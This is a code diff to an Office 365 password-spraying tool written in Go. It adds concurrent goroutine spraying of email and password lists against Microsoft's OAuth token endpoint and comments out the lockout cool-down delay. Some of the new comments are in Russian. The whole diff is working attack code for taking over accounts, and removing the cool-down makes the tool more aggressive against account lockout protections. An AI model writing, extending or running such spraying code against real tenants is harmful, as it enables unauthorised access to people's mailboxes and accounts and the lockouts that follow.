@@ -29,6 +29,14 @@ func SprayManagedO365(
 	file *os.File,
 ) {
 
+	defer func() {
+		// Recover from panic and log the error if any
+		if r := recover(); r != nil {
+			color.Red("[!] Panic occurred: %v", r)
+			log.Println("[!] Panic: ", r)
+		}
+	}()
+
 	getOauthTokenRequestJSON := url.Values{}
 	getOauthTokenRequestJSON.Add("resource", constants.RESOURCES[rand.Intn(len(constants.RESOURCES))])
 	getOauthTokenRequestJSON.Add("client_id", constants.CLIENT_IDS[constants.GetMapItemRandKey(constants.CLIENT_IDS)])
@@ -88,16 +96,6 @@ func SprayEmailsManagedO365(
 	threads int,
 ) {	
 
-	semaphore := make(chan struct{}, threads)
-	var wg sync.WaitGroup
-	semaphore <- struct{}{}
-	wg.Add(1)
-	go func() {
-		defer func() {
-			<-semaphore
-			wg.Done()
-		}()
-
 
 	color.Yellow("[+] Spraying For O365 Emails - Managed")
 	timeStamp := strconv.Itoa(time.Now().Year()) + strconv.Itoa(int(time.Now().Month())) + strconv.Itoa(int(time.Now().Hour())) + strconv.Itoa(int(time.Now().Minute())) + strconv.Itoa(int(time.Now().Second()))
@@ -108,7 +106,9 @@ func SprayEmailsManagedO365(
 		return
 	}
 	defer logFile.Close()
+	// 1 email
 	if len(email) > 0 {
+		// 1 password
 		if len(password) > 0 {
 			SprayManagedO365(
 				domainName,
@@ -119,6 +119,7 @@ func SprayEmailsManagedO365(
 				logFile,
 			)
 		}
+		//passwords from file
 		if len(password) == 0 && len(passwordFilePath) > 0 {
 			var lockoutCount = 0
 			file, err := os.Open(passwordFilePath)
@@ -154,7 +155,9 @@ func SprayEmailsManagedO365(
 			}
 		}
 	}
+	//emails from file
 	if len(email) == 0 && len(emailFilePath) > 0 {
+		// 1 password
 		if len(password) > 0 {
 			file, err := os.Open(emailFilePath)
 			if err != nil {
@@ -162,61 +165,106 @@ func SprayEmailsManagedO365(
 			}
 			defer file.Close()
 			scanner := bufio.NewScanner(file)
+
+			// Создаем канал с размерами буфера, чтобы ограничить количество одновременно работающих горутин
+			concurrentLimit := threads
+			sem := make(chan struct{}, concurrentLimit)
+			// Для ожидания завершения всех горутин
+			var wg sync.WaitGroup
+
 			for scanner.Scan() {
-				SprayManagedO365(
-					domainName,
-					scanner.Text(),
-					password,
-					"file",
-					maxLockouts,
-					logFile,
-				)
+				wg.Add(1)
+
+				go func(email string) {
+					defer wg.Done()
+
+					// Пытаемся захватить место в канале (блокирует, если превышен лимит)
+					sem <- struct{}{}
+					defer func() { <-sem }()
+
+					SprayManagedO365(
+						domainName,
+						email,
+						password,
+						"file",
+						maxLockouts,
+						logFile,
+					)
+
+				fmt.Printf("\rProgress: [%3d]", checkedUsers)
+
+				}(scanner.Text())	
+
 				time.Sleep(time.Duration(delay))
 			}
 			if err := scanner.Err(); err != nil {
 				log.Fatal(err)
 			}
+
+			wg.Wait()
+
 			if sprayedUsers > 0 {
 				color.Yellow("[+] " + strconv.Itoa(sprayedUsers) + " Valid O365 Credentials Found !")
 			} else {
 				color.Red("[-] No Valid O365 Credentials Found !")
 			}
 		}
+
+		//passwords from file
 		if len(password) == 0 && len(passwordFilePath) > 0 {
-			lockoutCount := 0
+			//lockoutCount := 0
 			passFile, err := os.Open(passwordFilePath)
 			if err != nil {
 				log.Fatal(err)
 			}
 			defer passFile.Close()
 			passScanner := bufio.NewScanner(passFile)
+
+			concurrentLimit := threads
+			sem := make(chan struct{}, concurrentLimit)
+			var wg sync.WaitGroup
+
 			for passScanner.Scan() {
-				if lockoutCount == (lockout - 1) {
+				/*if lockoutCount == (lockout - 1) {
 					color.Blue("[+] Cooling Down Lockout Time Period For " + strconv.Itoa(lockoutDelay) + " minutes")
 					time.Sleep(time.Duration(lockoutDelay) * time.Minute)
 					lockoutCount = 1
 				}
-				lockoutCount += 1
+				lockoutCount += 1*/
 				emailFile, err := os.Open(emailFilePath)
 				if err != nil {
 					log.Fatal(err)
 				}
 				defer emailFile.Close()
 				emailScanner := bufio.NewScanner(emailFile)
+				
 				for emailScanner.Scan() {
-					SprayManagedO365(
-						domainName,
-						emailScanner.Text(),
-						passScanner.Text(),
-						"file",
-						maxLockouts,
-						logFile,
-					)
+
+					wg.Add(1)
+
+					go func(email string, password string) {
+						defer wg.Done()
+						sem <- struct{}{}
+						defer func() { <-sem }()
+
+						SprayManagedO365(
+							domainName,
+							email,
+							password,
+							"file",
+							maxLockouts,
+							logFile,
+						)
+						fmt.Printf("\rProgress: [%3s:%3d]", password, checkedUsers)
+					
+						}(emailScanner.Text(), passScanner.Text())
+					
 					time.Sleep(time.Duration(delay))
 				}
 				if err := emailScanner.Err(); err != nil {
 					log.Fatal(err)
 				}
+				wg.Wait()
 			}
 			if err := passScanner.Err(); err != nil {
 				log.Fatal(err)
@@ -228,8 +276,4 @@ func SprayEmailsManagedO365(
 			}
 		}
 	}
-
-	}()
-
-	wg.Wait()
 }
